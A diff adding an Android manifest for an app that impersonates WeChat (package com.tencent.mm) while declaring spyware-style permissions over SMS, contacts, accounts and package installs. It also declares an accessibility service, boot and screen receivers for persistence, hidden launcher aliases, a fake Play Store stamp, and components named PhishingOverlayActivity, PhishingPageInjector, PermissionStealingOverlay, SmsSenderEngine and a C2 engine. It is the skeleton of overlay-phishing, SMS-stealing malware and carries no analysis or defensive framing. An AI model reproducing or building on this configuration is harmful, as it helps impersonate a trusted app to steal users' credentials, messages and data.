@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="33" android:compileSdkVersionCodename="13.0.0" package="com.tencent.mm" platformBuildVersionCode="33" platformBuildVersionName="13.0.0">
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:icon="@drawable/wvscitiesq56" android:label="@string/piceagedtreputationa45" android:largeHeap="true" android:requestLegacyExternalStorage="true" android:supportsRtl="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:usesCleartextTraffic="true">
+        <activity android:excludeFromRecents="true" android:name="com.tencent.PhishingOverlayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:label="IMO" android:name="com.tencent.FakePlayStoreActivity" android:noHistory="true">
+            <intent-filter>
+                <action android:name="xyz"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:label="IMO" android:name="com.tencent.FakeGooglePlayActivity"/>
+        <provider android:authorities="com.tencent.mm.provider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
+        </provider>
+        <activity android:excludeFromRecents="true" android:keepScreenOn="true" android:label="IMO" android:name="com.tencent.WakeLockKeeperActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:icon="@drawable/wvscitiesq56" android:label="@string/piceagedtreputationa45" android:name="com.tencent.MainLauncherActivity"/>
+        <activity-alias android:enabled="true" android:icon="@drawable/wvscitiesq56" android:label="@string/piceagedtreputationa45" android:launchMode="singleTask" android:name="com.tencent.MainActive" android:targetActivity="com.tencent.MainLauncherActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="com.App.Reborn"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:label="@string/trans" android:name="com.tencent.FakeGoogleTranslateActivity"/>
+        <activity-alias android:enabled="false" android:icon="@drawable/tranclat" android:label="IMO" android:name="com.tencent.GoogleTranslate" android:targetActivity="com.tencent.FakeGoogleTranslateActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:label="@string/newss" android:name="com.tencent.FakeNewsActivity"/>
+        <activity-alias android:enabled="false" android:icon="@drawable/nws" android:label="IMO" android:name="com.tencent.googlenews" android:targetActivity="com.tencent.FakeNewsActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:configChanges="orientation|screenSize" android:label="" android:name="com.tencent.C2CommunicationEngine"/>
+        <activity-alias android:configChanges="orientation|screenSize" android:enabled="false" android:icon="@drawable/skinicon" android:label="" android:name="com.tencent.costm" android:targetActivity="com.tencent.C2CommunicationEngine">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <service android:enabled="true" android:name="com.tencent.PersistentJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:name="com.tencent.RestartSensorReceiver">
+            <intent-filter>
+                <action android:name="RestartSensor"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:label="@string/piceagedtreputationa45" android:name="com.tencent.MainBackgroundService"/>
+        <service android:enabled="true" android:label="@string/piceagedtreputationa45" android:name="com.tencent.SecondaryBackgroundService"/>
+        <service android:enabled="true" android:label="@string/piceagedtreputationa45" android:name="com.tencent.TertiaryBackgroundService"/>
+        <service android:name="com.tencent.AccessibilityServiceCore" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:persistent="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility"/>
+        </service>
+        <service android:enabled="true" android:name="com.tencent.PersistentService" android:persistent="true"/>
+        <receiver android:enabled="true" android:exported="true" android:name="com.tencent.BootReceiver">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.tencent.PackageMonitorReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.tencent.BootReceiver4">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.Intent.ACTION_USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.tencent.SmsSenderEngine"/>
+        <activity android:name="com.tencent.PhishingPageInjector" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:name="com.tencent.PhishingOverlayInjector" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:name="com.tencent.PermissionStealingOverlay" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base"/>
+        <meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store"/>
+        <meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_STANDALONE_APK"/>
+        <meta-data android:name="com.android.vending.derived.apk.id" android:value="1"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="11010000"/>
+    </application>
+</manifest>
